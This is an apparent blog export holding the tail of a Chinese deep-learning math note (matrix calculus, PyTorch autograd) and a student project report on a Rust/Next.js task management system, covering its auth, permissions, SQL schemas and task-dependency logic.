\\frac{\\partial v}{\\partial \\mathbf{x}}$ | $\\frac{\\partial u}{\\partial \\mathbf{x}}v + \\frac{\\partial v}{\\partial \\mathbf{x}}u$ | $\\mathbf{u}^T\\frac{\\partial \\mathbf{v}}{\\partial \\mathbf{x}}+\\mathbf{v}^T\\frac{\\partial \\mathbf{u}}{\\partial \\mathbf{x}}$ |\n\n### 3.2 标量->向量微分\n\n即自变量是标量，因变量是向量。\n\n$$\n\\begin{split}\\mathbf{y}=\n\\begin{bmatrix}\ny1 \\\\\ny2 \\\\\n\\vdots \\\\\ny_n\n\\end{bmatrix}\\end{split}\n$$\n\n有：\n\n$$\n\\begin{split}\n\\frac{\\partial \\mathbf{y}}{\\partial x}=\n\\begin{bmatrix}\n\\frac{\\partial y_1}{\\partial x} \\\\\n\\frac{\\partial y_2}{\\partial x} \\\\\n\\vdots \\\\\n\\frac{\\partial y_m}{\\partial x}\n\\end{bmatrix}\\end{split}\n$$\n\n仍然为列向量\n\n### 3.3 向量->向量微分\n\n即自变量和因变量都是向量\n\n$$\n\\begin{split}\\mathbf{x}=\n\\begin{bmatrix}\nx1 \\\\\nx2 \\\\\n\\vdots \\\\\nx_n\n\\end{bmatrix}\\end{split}\n$$\n\n$$\n\\begin{split}\\mathbf{y}=\n\\begin{bmatrix}\ny1 \\\\\ny2 \\\\\n\\vdots \\\\\ny_m\n\\end{bmatrix}\\end{split}\n$$\n\n$$\n\\frac{\\partial \\mathbf{y}}{\\partial \\mathbf{x}} =\n\\begin{bmatrix}\n\\frac{\\partial y_1}{\\partial \\mathbf{x}} \\\\\n\\frac{\\partial y_2}{\\partial \\mathbf{x}} \\\\\n\\vdots \\\\\n\\frac{\\partial y_m}{\\partial \\mathbf{x}} \\\\\n\\end{bmatrix}\n=\n\\begin{bmatrix}\n\n\\frac{\\partial y_1}{\\partial x_1} &\n\\frac{\\partial y_1}{\\partial x_2} &\n\\cdots &\n\\frac{\\partial y_1}{\\partial x_n} \\\\\n\n\\frac{\\partial y_2}{\\partial x_1} &\n\\frac{\\partial y_2}{\\partial x_2} &\n\\cdots &\n\\frac{\\partial y_2}{\\partial x_n} \\\\\n\n \\vdots & \\vdots & \\ddots &\\vdots\\\\\n\n\\frac{\\partial y_m}{\\partial x_1} &\n\\frac{\\partial y_m}{\\partial x_2} &\n\\cdots &\n\\frac{\\partial y_m}{\\partial x_n} \\\\\n\n\\end{bmatrix}\n$$\n\n采用分子布局的话，分子来决定行，分母来决定列。也就是如果是两个行向量进行求导，那么也需要把其中一个转置成列向量。\n\n| $\\mathbf{y}$                                       | $\\mathbf{a}$ | $\\mathbf{x}$ | $\\mathbf{Ax}$ | $\\mathbf{x}^T\\mathbf{A}$ | $a\\mathbf{u}$                                      | $\\mathbf{Au}$                                               | $\\mathbf{u}+\\mathbf{v}$                                                                             |\n| -------------------------------------------------- | ------------ | ------------ | ------------- | ------------------------ | -------------------------------------------------- | ----------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |\n| $\\frac{\\partial  \\mathbf{y}}{\\partial \\mathbf{x}}$ | $\\mathbf{0}$ | $\\mathbf{I}$ | $\\mathbf{A}$  | $\\mathbf{A}^T$           | $a\\frac{\\partial \\mathbf{u}}{\\partial \\mathbf{x}}$ | $\\mathbf{A}\\frac{\\partial \\mathbf{u}}{\\partial \\mathbf{x}}$ | $\\frac{\\partial \\mathbf{u}}{\\partial \\mathbf{x}} + \\frac{\\partial \\mathbf{v}}{\\partial \\mathbf{x}}$ |\n\n### 3.4 矩阵相关微分\n\n| 自变量       | 因变量       | 微分结果         |                    |\n| ------------ | ------------ | ---------------- | ------------------ |\n| $(n,k)$ 矩阵 | 标量         | $(k,n)$ 矩阵     | 自变量转置         |\n| $(n,k)$ 矩阵 | $(m,1)$ 向量 | $(m,k,n)$ 张量   | 自变量转置，放后面 |\n| $(n,k)$ 矩阵 | $(m,l)$ 矩阵 | $(m,l,k,n)$ 张量 | 自变量转置，放后面 |\n| 标量         | $(m,l)$ 矩阵 | $(m,l)$ 矩阵     | 因变量不变         |\n| $(n,1)$ 向量 | $(m,l)$ 矩阵 | $(m,l,n)$ 张量   | 因变量不变，放前面 |\n\n### 3.5 链式法则\n\n主要把形状搞对\n\n![](http://pic.caiwen.work/i/2025/07/06/686a25b3a1af8.png)\n\n![](http://pic.caiwen.work/i/2025/07/06/686a26e537c30.png)\n\n![](http://pic.caiwen.work/i/2025/07/06/686a28aba157f.png)\n\n### 3.6 自动微分\n\n首先需要使用 `requires_grad_` 来启用自动微分\n\n```python\nimport torch\n\nx = torch.arange(4.0)\nx.requires_grad_(True)  # 等价于x=torch.arange(4.0,requires_grad=True)\nx.grad  # 默认值是None\n```\n\n然后可以继续进行计算：\n\n```python\ny = 2 * torch.dot(x, x)\ny\n# tensor(28., grad_fn=<MulBackward0>)\n```\n\n要将 `y` 关于 `x` 求导数的话：\n\n```python\ny.backward() # 先执行这个\nx.grad # 然后就会算到梯度了\nx.grad == 4 * x\n# tensor([True, True, True, True])\n```\n\n在默认情况下，PyTorch会累积梯度，我们需要清除之前的值，使用 `grad.zero_`\n\n```python\n# 在默认情况下，PyTorch会累积梯度，我们需要清除之前的值\nx.grad.zero_()\ny = x.sum()\ny.backward()\nx.grad\n# tensor([1., 1., 1., 1.])\n```\n\n有时候我们想把某些计算跟分离开，比如：\n\n```python\nx.grad.zero_()\ny = x * x\nu = y.detach() # 这里我们只希望单纯的把 y 的值赋值给 u，而不携带之前的运算步骤\nz = u * x\n\nz.sum().backward()\nx.grad == u # u 作为常数，求导完之后就是 u\n# tensor([True, True, True, True])\n```\n\n即使构建函数的计算图需要通过Python控制流（例如，条件、循环或任意函数调用），我们仍然可以计算得到的变量的梯度\n\n```python\ndef f(a):\n    b = a * 2\n    while b.norm() < 1000:\n        b = b * 2\n    if b.sum() > 0:\n        c = b\n    else:\n        c = 100 * b\n    return c\na = torch.randn(size=(), requires_grad=True)\nd = f(a)\nd.backward()\n```\n\n","summary":"本文介绍了张量的基本操作、线性代数基础以及微分计算，包括张量创建、运算、矩阵乘法、范数、自动微分和链式法则等内容。","key":["ai","深度学习","机器学习","线性代数","微分"],"tags":[],"path":["深度学习","深度学习-数学基础.md"],"background":"http://pic.caiwen.work/i/2025/07/13/68730b3b4f779.png","recommend":false,"status":"published"},{"type":"Article","title":"程序设计大作业实验报告","id":"fuzzy-enigma","createTime":"2025-05-28T12:35:00.000Z","updateTime":"2025-09-05T13:34:05.189Z","content":"\n| 课程名称       | 程序设计                                 |\n| -------------- | ---------------------------------------- |\n| 项目名称       | FuzzyEnigma——一个简单的任务管理系统      |\n| 项目代码量     | 7900 行代码左右                          |\n| 完成时间       | 2025 年 5 月 24 日                       |\n| Github开源地址 | https://github.com/caiwen666/FuzzyEnigma |\n| 演示地址       | http://fe.caiwen.work                    |\n\n## 一. 实验目的\n\n1. 掌握面向对象的管理信息系统开发\n2. 体验类的封装与继承\n3. 尝试SSR（服务端渲染）的前后端开发架构\n4. 尝试Rust的后端开发\n\n## 二. 主要工作\n\n### 2.1 技术选型\n\n技术选型是一个项目开始时的主要问题之一，选择好的技术栈可以做到事半功倍的作用。\n\n首先是编程语言，我考虑了自己比较熟悉的一些编程语言进行对比：\n\n- C++：C++ 是本门课程的主讲语言，理论上应该选用 C++。但我考虑这个项目应该做成一个前后端分离的一个项目，而 C++ 的强项在系统级编程领域，在互联网领域并非 C++ 强项。虽然 C++ 的生态很丰富，但是 C++ 中使用第三方工具库相当麻烦。可以预见地，使用 C++ 进行开发会严重拖慢效率，并且没有 ”站在巨人的肩膀上“ 的优点。\n- Java：Java 和 C++ 有很多相通之处，且 Java 的面向对象思想非常浓厚。但 Java 的内存占用很高，且我个人认为 Java 中很多地方所谓的 ”面向对象“ 有滥用之势，且根据我之前的经验，Java 的开发有点老旧，用来开发项目很难受，因此放弃了 Java。\n- Python：Python 作为弱类型的语言，用于开发项目是个灾难，而且 Python 的面向对象也是非常简陋，严格意义上并非面向对象的语言。且 Python 作为解释性语言运行较慢，GIL 锁限制了项目以后的潜力，因此放弃了 Python。\n- Rust：Rust 作为一门新兴的语言，有很多现代的地方。且 Rust 作为对标 C++ 的语言，将 Rust 和 C++ 进行对比学习，反而能更深刻的了解这两门语言。Rust 没有 GC，效率更高，有强大的类型系统和编译检查，使得程序不会出现暗病。综合考虑，我选用了 Rust 作为本次项目的开发语言。\n\n对于前端部分，目前主流的方向有两个。一个是 SPA，即单页应用，可以理解为网页首次加载时就把所有的页面都加载，后续页面跳转只不过是挂载不同的组件。一个是 SSR，即服务端渲染，可以理解为我们在 SPA 的基础上，让一些初始数据可以在服务端渲染。\n\nSPA 是完全的前后端分离，但是根据先前开发经验会存在路由管理等问题，因此我们选用了 SSR。\n\n于是前端部分的技术栈为：\n\n- 响应式框架：React\n- SSR：Next.js\n- UI\n  - Material UI：MUI 是我经常用的前端组件框架，且我个人非常喜欢谷歌的 Material Design 设计风格\n  - TailwindCSS：TailwindCSS 将 CSS 的属性用原子化的类名表示，并提供响应式的支持。虽说使用 TailwindCSS 和直接写内联样式本质相同，但实践证明 TailwindCSS 的开发效率和心里感受都好很多\n  - Notistack：MUI 推荐的一个消息提示框组件。本项目在操作成功/失败时左下角的提示就是使用这个库做到的\n- 代码质量\n  - Typescript：Javascript 作为弱类型语言，用于工程开发会产生很多问题。Typescript 是 Javascript 的超集，为 Javascript 提供了类型支持，减少类型问题并增强开发时的代码补全\n  - Eslint：一个增强 IDE 代码检查的工具\n  - Prettier：一个代码格式化工具，可以使得项目的代码变得整洁且风格统一\n- 状态管理：Zustand\n- 表单验证：ReactHookForm，Zod：这两个工具配合使得项目前端有表单的地方开发起来效率更高\n- 网络请求：Axios\n- 其他：\n  - classnames：React 中一个管理类名的工具\n  - dayjs：日期处理工具\n  - markdown-it：markdown 渲染工具\n\n后端部分的技术栈为\n\n- Salvo：HTTP 框架\n\n- anyhow、thiserror：提供更优雅的错误处理\n- lettre：邮件发送工具\n- moka：缓存工具。为了保持项目的简单性，且本项目并没有分布式架构，所以我们并没有选用 redis\n\n- sqlx：数据库操作的工具\n- validator：请求参数校验工具\n\n以及 MySQL，提供数据的持久化存储\n\n### 2.2 项目架构\n\n经过一段时间的摸索，本项目形成了这样的一个架构\n\n![image-20250523171912663](http://pic.caiwen.work/i/2025/05/28/6836f84bb1aec.png)\n\n#### 2.2.1 前端\n\n![image-20250523171544811](http://pic.caiwen.work/i/2025/05/28/6836f86a26c9a.png)\n\n前端中，每个页面的初始数据都由 `page.tsx` 在服务端中获取，并将初始数据通过 Props 注入到客户端组件中。服务端和客户端组件使用的 Request 实例（在本项目中为 Axios 实例）不同，但都经过统一的 api 函数来请求后端。\n\n#### 2.2.2 后端\n\n![image-20250523172425262](http://pic.caiwen.work/i/2025/05/28/6836f87f460dd.png)\n\nRouter 层负责校验请求参数是否合法，是否符合权限。校验完毕之后，请求交给 Service 层处理。Service 层注重业务逻辑。Service 如果需要与持久化数据进行交互的话，则调用 Repository 层或者文件存储层。Repository 注重数据库操作。原本计划的文件存储层是打算接入 OSS （对象存储）服务的，但由于时间原因，本项目的资源选择在本地存储。Moka 作为缓存，放在 Repository 层比较好，但本项目为了简单期间并没有在后端和 MySQL 之间建立一个缓存层，Moka 在本项目中的用处是存储登录令牌，邮件验证码验证等会定时过期的数据，因此放在了 Service 层\n\n### 2.3 用户管理\n\n#### 2.3.1 用户鉴权\n\n一般而言用户鉴权有两种：\n\n- Stateful，用户的登录状态在服务端中也存储，一般而言是登录成功之后下发一个令牌，客户端得到令牌之后在每次请求都携带这个令牌，由服务端查询存储来校验令牌是否有效\n- Stateless，服务端不存储用户的令牌。登陆后下发给用户的令牌是加密的，并有不对称加密的特点：只有服务端能加密，但所有人都能解密。基于这个特点，服务端只需要尝试解密用户提供的令牌即可完成鉴权\n\n对于后者，难以控制用户的登录状态，所以本项目选择了第一种\n\n登录时，后端从数据库中获取密码进行比对，比对成功后服务端生成一个 token，把 token 存储在缓存中，并下发给客户端\n\n```rust\n/// server/service/user.rs\n/// 生成用户登录状态的会话 token\npub async fn generate_user_session(uid: u32) -> Result<String> {\n    let token = compute_str_md5(format!(\n        \"user_session_{}_{}\",\n        uid,\n        Utc::now().timestamp_millis()\n    ));\n    CACHE\n        .insert(CacheType::UserSession(token.clone()), uid.to_string())\n        .await;\n    Ok(token)\n}\n```\n\n客户端收到 token 后将其存储在 cookie 中\n\n```tsx\n/// web/src/app/user/login/LoginForm.tsx\ntry {\n\tconst token = await login(request, email, password);\n\tsetCookie(\"session\", token, { maxAge: 60 * 60 * 12 });\n\tif (callback) {\n\t\twindow.location.replace(callback);\n\t} else {\n\t\twindow.location.replace(\"/\");\n\t}\n} catch {}\n```\n\n不选择存储在 LocalStorage 的原因，一个是 LocalStorage 无法设置过期时间，另一个是，有一部分的后端请求是 Next.js 在服务端渲染的时候产生的，服务端组件的请求也需要 token，而 Next.js 的服务端组件不可能获取到 LocalStorage 的数据来得到 token，只能通过浏览器的请求来获得token，同时浏览器请求时无法自动携带 LocalStorage 的数据，但是可以自动携带 Cookie ，所以我们选择存放在 Cookie 中\n\n而后端的接口鉴权的时候是通过 HTTP 请求头的 Authorization 字段获取 token 并进行检查，所以，对于客户端组件，请求前的准备如下：\n\n```ts\n/// web/src/utils/request/client.ts\ninstance.interceptors.request.use(\n\t(config) => {\n\t\tconfig.headers[\"Authorization\"] = getCookie(\"session\");\n\t\treturn config;\n\t},\n\t...\n);\n```\n\n客户端组件请求接口的一般做法是：\n\n```ts\nimport request from \"@/utils/request/client\";\n// 这里拿登录接口举例\nconst token = await login(request, email, password);\n```\n\n对于服务端组件，在中间件中获取到 token\n\n```ts\n/// web/src/middleware.ts\nif (request.cookies.has(\"session\")) {\n\t// 从 cookie 中获取 token\n\tconst session = request.cookies.get(\"session\")?.value;\n\tif (!session) {\n\t\treturn NextResponse.redirect(jump);\n\t}\n\tconst r = await getServerRequest(session);\n\ttry {\n\t\tconst info = await getUserInfo(r);\n\t\trequest.headers.set(\"uid\", info.basic_info.uid.toString());\n\t\trequest.headers.set(\"username\", info.basic_info.username);\n\t\trequest.headers.set(\"email\", info.basic_info.email);\n\t\trequest.headers.set(\"permission\", JSON.stringify(info.permission));\n\t\t// 注入到 header 中，因为在 Next.js 中，后续的组件无法获取 cookie 了，只能获取 header\n\t\trequest.headers.set(\"session\", session);\n\t} catch {\n\t\treturn NextResponse.redirect(jump);\n\t}\n} else {\n\treturn NextResponse.redirect(jump);\n}\n```\n\n服务端组件请求接口的一般做法是：\n\n```ts\n/// web/src/app/task/detail/page.tsx\nconst header = await headers();\nconst session = header.get(\"session\") as string;\nconst r = await getServerRequest(session);\n// 以获取任务详情信息接口举例\nconst task = await getTaskDetail(r, Number(id));\n\n/// web/src/utils/request/server.ts\nexport const getServerRequest = async (token: string) => {\n\tconst instance = axios.create({\n\t\tbaseURL: API_URL_LOCAL,\n\t\ttimeout: 10000,\n\t\twithCredentials: true,\n\t});\n\tinstance.interceptors.request.use((config) => {\n\t\tconfig.headers[\"Authorization\"] = token;\n\t\treturn config;\n\t});\n\tinstance.interceptors.response.use((result) => {\n\t\tconst { code, msg, data } = result.data;\n\t\tif (code === 200) return data;\n\t\treturn Promise.reject(msg);\n\t});\n\treturn instance;\n};\n```\n\n总体上说，我们希望仍保持前后端分离总体的思想，但是把部分本应客户端组件发送的请求转移到服务端组件中\n\n同时，我们在前端设置 Cookie 中设置了过期时间，同时后端存储 token 时也设置了过期时间（见 `server/src/cache.rs`，这使得经过一段时间，用户的登录状态会过期）\n\n#### 2.3.2 权限管理\n\n每个用户的权限是一个 string 数组，权限信息存储在 tb_user_permissions 表中，其定义为\n\n```sql\ncreate table tb_user_permissions\n(\n    uid   int unsigned not null,\n    value varchar(255) not null,\n    primary key (uid, value),\n    constraint tb_user_permissions_ibfk_1\n        foreign key (uid) references tb_user (uid)\n            on delete cascade\n);\n```\n\n权限的定义和解释如下\n\n```ts\n/// web/src/config/index.ts\nexport const PERMISSIONS = [\n\t{\n\t\tvalue: \"manage_all_task\",\n\t\tlabel: \"可以管理所有任务\",\n\t},\n\t{\n\t\tvalue: \"manage_user\",\n\t\tlabel: \"可以进行用户管理\",\n\t},\n\t{\n\t\tvalue: \"root\",\n\t\tlabel: \"可以更改用户权限，更改用户角色，同时不能被删除\",\n\t},\n\t{\n\t\tvalue: \"assign_task\",\n\t\tlabel: \"可以将任务指派给其他人\",\n\t},\n\t{\n\t\tvalue: \"ai\",\n\t\tlabel: \"可以使用AI助手\",\n\t},\n];\n```\n\n其中 root 权限需要手动执行 sql 语句赋予。其他的权限可以由拥有 root 权限的用户赋予\n\n设置灵活分配的这些权限，可以实现不同的用户角色\n\n例如，对于普通用户，可以不分配任何权限，普通用户可以创建任务并将任务分配给自己，进行自由学习。对于学生，可以赋予 `ai` 权限，允许学生使用 AI 功能。对于教师，可以分配 `assign_task` 权限，教师可以创建任务并指派给他人。对于管理员，可以分配 `assign_task` 、`manage_all_task`，`manage_user` 权限，对所有的任务和用户进行管理。对于超级管理员则可分配所有权限。\n\n在 router 层进行权限检查，如\n\n```rust\n/// server/src/router/task.rs\n#[handler]\npub async fn delete_task(req: &mut Request, depot: &mut Depot) -> RouterResult {\n    let id = req.query::<u32>(\"id\").ok_or(AppError::ArgumentError)?;\n    let task = service::task::get(id).await?.ok_or(anyhow!(\"任务不存在\"))?;\n    let context = depot.obtain::<AppContext>().unwrap();\n    // 如果不是任务的创建者，且没有 manage_all_task 权限，则拒绝\n    if context.user.uid != task.publisher && !context.permissions.manage_all_task() {\n        return Err(AppError::PermissionDenied.into());\n    }\n    ...\n}\n```\n\n### 2.4 任务管理\n\n#### 2.4.1 业务需求梳理\n\n根据作业文档的表述，我们可以梳理出一个任务应包含：任务标题，任务描述，任务的截止时间，任务的预计耗时，任务的优先级，任务的发布者。\n\n作业中提到了很多任务类型，但除了小组任务之外，其他任务并无本质区别，因此我们将任务类型也作为任务的一个属性。\n\n对于小组任务，我们可能要考虑将小组与任务相关联。\n\n考虑到作业中“自由学习者”这个字眼，我们设计为允许用户自行创建任务，也可以创建一个任务，然后把这个任务指派给其他人。为了和权限系统打配合，我们设置只有拥有 `assign_task` 权限才可以把一个任务指派给其他人（拥有这个权限的人可以被视为教师角色），如果没有的话只能把这个任务指派给自己。\n\n为了将任务指派和小组更好地结合，我们设计为：每个任务在创建后都有一个默认的分组，对于一般的任务，增删人员都视为给这个默认的分组里增删人员，一般的任务不允许再增加分组。对于小组任务，则可以增删分组，并把不同的用户添加到不同的小组中。\n\n为了简单起见，我们暂时仅支持由任务的创建者将任务指派，而不支持用户主动请求加入一个任务。我们暂时只支持任务创建者来分组，决定哪些用户在同一个小组，而不支持用户自行挑选分组。\n\n作业中还要求支持多级子任务，于是我们做出这样的设计：每个任务都可以设置前置任务，只有完成了前置任务才可以完成当前任务。简单起见，每个任务只能设置一个前置任务，同时一旦任务创建后，其依赖的任务就不能被修改了。这样的约定保证了任务的依赖关系一定是一个树或者说是森林结构，不会出现循环依赖关系。\n\n#### 2.4.2 分组\n\n我们建立 tb_group 表，表示每个任务底下的分组\n\n```sql\ncreate table tb_group\n(\n    id  int unsigned auto_increment\n        primary key,\n    tid int unsigned not null,\n    constraint tb_group_ibfk_1\n        foreign key (tid) references tb_task (id)\n            on delete cascade\n);\n\ncreate index tid\n    on tb_group (tid);\n```\n\n然后建立 link_group_user 表，将分组和用户关联起来，其中 finish 字段记录用户是否完成这个任务\n\n```sql\ncreate table link_group_user\n(\n    gid    int unsigned         not null,\n    uid    int unsigned         not null,\n    finish tinyint(1) default 0 not null,\n    primary key (gid, uid),\n    constraint link_group_user_ibfk_2\n        foreign key (uid) references tb_user (uid)\n            on delete cascade,\n    constraint link_group_user_ibfk_3\n        foreign key (gid) references tb_group (id)\n            on delete cascade\n);\n\ncreate index uid\n    on link_group_user (uid);\n```\n\n由于用户和任务之间的关系间隔了一个小组，所以很多的操作需要较为复杂的连表查询，如获取一个用户参加的所有任务：\n\n```rust\n/// server/src/repository/task.rs\npub async fn get_participated(uid: u32) -> Result<Vec<(Task, bool)>> {\n    let res = sqlx::query!(\n        r#\"\n        SELECT task.id, task.title, task.type AS \"typ!\", task.priority, task.cost, task.deadline, task.publisher, task.prev, link_group_user.finish\n        FROM tb_task task\n        INNER JOIN tb_group ON task.id = tb_group.tid\n        INNER JOIN link_group_user ON tb_group.id = link_group_user.gid\n        WHERE link_group_user.uid = ?\n        \"#,\n        uid\n    ).fetch_all(db().await).await?.into_iter().map(|r| (\n        ....\n    )).collect::<Vec<_>>();\n    Ok(res)\n}\n```\n\n在前端添加小组成员的时候，我们需要根据关键词，对用户进行搜索。后端提供一个接口，可以列出所有用户名中包含给定关键词的用户。通过 sql 语句中的 LIKE 关键字实现：\n\n```rust\n/// server/src/repository/user.rs\npub async fn search(keyword: &str) -> Result<Vec<UserBasicInfo>> {\n    let res = sqlx::query_as!(\n        UserBasicInfo,\n        r#\"\n        SELECT uid, username, email\n        FROM tb_user\n        WHERE username LIKE ?\n        \"#,\n        format!(\"%{}%\", keyword)\n    )\n    .fetch_all(db().await)\n    .await?;\n    Ok(res)\n}\n```\n\n前端基于 lodash，搜索时采用防抖技术\n\n```ts\nconst handleSearch = _.debounce(async (value: string) => {\n    ...\n}, 1000);\n```\n\n#### 2.4.3 任务依赖\n\n根据 2.4.1 内容，我们对任务的依赖关系做了很大的简化，但仍有很多地方需要考虑\n\n由于任务的依赖关系是自身对自身的，所以无需再建立一个表，只需要给 tb_task 表设置一个 prev 字段，表示当前任务的前置任务id\n\n```sql\ncreate table tb_task\n(\n    id          int unsigned auto_increment\n        primary key,\n    title       varchar(255)    not null,\n    description text            not null,\n    type        varchar(255)    not null,\n    priority    int unsigned    not null,\n    cost        int unsigned    not null,\n    deadline    bigint unsigned not null,\n    publisher   int unsigned    not null,\n    prev        int unsigned    null,\n    constraint fk_publisher\n        foreign key (publisher) references tb_user (uid)\n            on delete cascade\n);\n\n```\n\n首先，一个任务（下文称为子任务）添加成员的时候，必须这个任务所依赖的任务（下文称之为父任务）已经添加了目标成员，才可以允许添加，否则，父任务没有指派给目标成员的话，那么目标成员永远无法完成子任务\n\n同样，父任务在删除一个成员的时候，如果存在一个子任务指派给了目标成员，那么不应该允许这个删除操作，否则会破坏依赖关系的完整。由于一个任务的子任务可能有多个，所以仍然需要一个较为复杂的连表查询去检查这一点\n\n```rust\n/// server/src/repository/task.rs\n/// 检查某个用户是否也加入了依赖于某个任务的任务\npub async fn check_rely(uid: u32, task_id: u32) -> Result<u32> {\n    let res = sqlx::query!(\n        r#\"\n        SELECT COUNT(DISTINCT tb_task.id) AS count\n        FROM tb_task\n        INNER JOIN tb_group ON tb_task.id = tb_group.tid\n        INNER JOIN link_group_user ON tb_group.id = link_group_user.gid\n        WHERE link_group_user.uid = ? AND tb_task.prev = ?\n        \"#,\n        uid,\n        task_id\n    )\n    .fetch_one(db().await)\n    .await?;\n    Ok(res.count as u32)\n}\n```\n\n同理，如果一个任务被其他任务依赖，那么这个任务是不被允许删除的。本项目可以在删除失败的时候给出当前任务被哪些任务依赖，做法是简单的：\n\n```rust\n/// server/src/repository/task.rs\n/// 被哪些任务作为依赖\npub async fn get_as_prev(id: u32) -> Result<Vec<Task>> {\n    let res = sqlx::query!(\n        r#\"\n        SELECT id, title, type AS \"typ!\", priority, cost, deadline, publisher, prev\n        FROM tb_task\n        WHERE prev = ?\n        \"#,\n        id\n    )\n    .fetch_all(db().await)\n    .await?\n    .into_iter()\n    .map(|r| Task {\n        id: r.id,\n        info: TaskInfo {\n            title: r.title,\n            typ: r.typ.into(),\n            priority: r.priority.into(),\n            cost: r.cost,\n            deadline: r.deadline,\n        },\n        publisher: r.publisher,\n        prev: r.prev,\n    })\n    .collect::<Vec<_>>();\n    Ok(res)\n}\n```\n\n#### 2.4.4 自动紧急/重要四象限分类\n\n我们在前端，根据任务的优先级，剩余时间，来判断一个任务是否重要与是否紧急\n\n考虑分类的数量较多（五个，四象限分类再加上全部未完成任务），我们考虑对分类也进行列表渲染\n\n```tsx\n/// web/src/app/Home.tsx\nconst TaskCategories = [\n\t{\n\t\tname: \"所有任务\",\n\t\tid: \"all\",\n\t\ticon: <FormatLineSpacingOutlined />,\n\t},\n\t{\n\t\tname: \"重要且紧急\",\n\t\tid: \"important_and_urgent\",\n\t\ticon: <WarningAmberOutlined />,\n\t},\n\t{\n\t\tname: \"重要但不紧急\",\n\t\tid: \"important_but_not_urgent\",\n\t\ticon: <LightbulbOutlined />,\n\t},\n\t{\n\t\tname: \"紧急但不重要\",\n\t\tid: \"urgent_but_not_important\",\n\t\ticon: <DirectionsBikeOutlined />,\n\t},\n\t{\n\t\tname: \"不重要且不紧急\",\n\t\tid: \"not_important_and_not_urgent\",\n\t\ticon: <HotelOutlined />,\n\t},\n];\n\ninterface UncompletedTaskCategory {\n\tall: Task[];\n\timportant_and_urgent: Task[];\n\timportant_but_not_urgent: Task[];\n\turgent_but_not_important: Task[];\n\tnot_important_and_not_urgent: Task[];\n\t[index: string]: Task[];\n}\n\n....\nconst uncompleted_task: UncompletedTaskCategory = {\n    all: [],\n    important_and_urgent: [],\n    important_but_not_urgent: [],\n    urgent_but_not_important: [],\n    not_important_and_not_urgent: [],\n};\n....\n\n....\nlist.forEach((item) => {\n    const status = getTaskStatus(item.task.info.deadline);\n    if (item.finish) {\n        completed_task.push(item.task);\n    } else if (status === \"expired\") {\n        expired_task.push(item.task);\n    } else {\n        uncompleted_task.all.push(item.task);\n        // 优先级为高就是重要，反之则不重要\n        const important = item.task.info.priority === \"high\";\n        // 根据颜色来判断是否紧急\n        const urgent = status === \"red\" || status === \"orange\";\n        if (important && urgent) {\n            uncompleted_task.important_and_urgent.push(item.task);\n        }\n        if (important && !urgent) {\n            uncompleted_task.important_but_not_urgent.push(item.task);\n        }\n        if (!important && urgent) {\n            uncompleted_task.urgent_but_not_important.push(item.task);\n        }\n        if (!important && !urgent) {\n            uncompleted_task.not_important_and_not_urgent.push(item.task);\n        }\n    }\n});\n....\n```\n\n我们设计了一个 getTaskStatus 函数，根据一个任务的剩余时间来返回不同的颜色，用于前端的显示。剩余时间较多则为绿色，较少则为红色\n\n```ts\n/// web/src/utils/task.ts\nexport const getTaskStatus = (deadline: number) => {\n\tconst now = new Date().getTime();\n\tconst remain_time = deadline - now;\n\tif (remain_time <= 0) {\n\t\treturn \"expired\";\n\t} else if (remain_time <= TASK_RED_LIMIT) {\n\t\treturn \"red\";\n\t} else if (remain_time <= TASK_ORANGE_LIMIT) {\n\t\treturn \"orange\";\n\t} else if (remain_time <= TASK_LIME_LIMIT) {\n\t\treturn \"lime\";\n\t} else {\n\t\treturn \"green\";\n\t}\n};\n```\n\n每个颜色的阈值定义如下：\n\n```ts\n/// web/src/config/index.ts\nexport const TASK_RED_LIMIT = 1000 * 60 * 60 * 3; // 3 hours\nexport const TASK_ORANGE_LIMIT = 1000 * 60 * 60 * 24; // 1 day\nexport const TASK_LIME_LIMIT = 1000 * 60 * 60 * 24 * 3; // 3 day\n```\n\n颜色的具体定义参考 `tailwind.config.js` 。\n\n#### 2.4.5 休息建议/时间分配建议\n\n见 4.2 和 4.3 节内容。\n\n### 2.5 学习资源\n\n#### 2.5.1 业务需求梳理\n\n为了简单起见，我们把资源关联在任务上，作为每个任务的附件。\n\n作业文件中提到的若干学习资源本质上可以分为两类：文件和链接。\n\n为了简单起见，资源的评分设为点赞和点踩两类。\n\n可以给资源添加标签，并且可以给资源进行评论。\n\n#### 2.5.2 资源评分\n\n我们不仅需要维护一个资源点赞和点踩的数量，还需要知道每个用户是点赞还是点踩了，所以需要开一个表 link_user_resource 进行维护，其定义如下：\n\n```sql\ncreate table link_user_resource\n(\n    rid      int unsigned not null,\n    uid      int unsigned not null,\n    attitude varchar(255) not null,\n    primary key (rid, uid),\n    constraint link_user_resource_ibfk_1\n        foreign key (rid) references tb_resource (id)\n            on delete cascade,\n    constraint link_user_resource_ibfk_2\n        foreign key (uid) references tb_user (uid)\n            on delete cascade\n);\n\ncreate index uid\n    on link_user_resource (uid);\n\n```\n\nattitude 表示用户对资源的态度，如果不存在或为 none 则为未作评价，为 up 则为点赞，为 down 则为点踩。\n\n考虑到在前端，我们可能从即没点赞也没点踩到点赞或点踩，也可能取消点赞或点踩，也可能从点赞到点踩，情况比较多，分别提供点赞和点踩的接口并不明智。我们选择直接提供“设置对资源的态度”的接口，其对应于的 repository 层的核心代码如下：\n\n```rust\n/// server/src/repository/resource.rs\npub async fn update_attitude(resource_id: u32, uid: u32, attitude: ResourceAttitude) -> Result<()> {\n    sqlx::query!(\n        r#\"\n        INSERT INTO link_user_resource (uid, rid, attitude)\n        VALUES (?, ?, ?)\n        ON DUPLICATE KEY UPDATE attitude = ?\n        \"#,\n        uid,\n        resource_id,\n        String::from(attitude),\n        String::from(attitude)\n    )\n    .execute(db().await)\n    .await?;\n    Ok(())\n}\n```\n\n#### 2.5.3 资源评论\n\n评论功能是简单的，我们定义了一个 tb_comment 表存储评论：\n\n```sql\ncreate table tb_comment\n(\n    id      int unsigned auto_increment\n        primary key,\n    content text            not null,\n    rid     int unsigned    not null,\n    time    bigint unsigned not null,\n    uid     int unsigned    not null,\n    constraint tb_comment_ibfk_2\n        foreign key (uid) references tb_user (uid)\n            on delete cascade,\n    constraint tb_comment_ibfk_3\n        foreign key (rid) references tb_resource (id)\n            on delete cascade\n);\n\ncreate index rid\n    on tb_comment (rid);\n\ncreate index uid\n    on tb_comment (uid);\n```\n\n其在 repository 层对应的增删查代码都很简单：\n\n```rust\n/// server/src/repository/resource.rs\npub async fn add_comment(resource_id: u32, uid: u32, content: String) -> Result<u32> {\n    let res = sqlx::query!(\n        r#\"\n        INSERT INTO 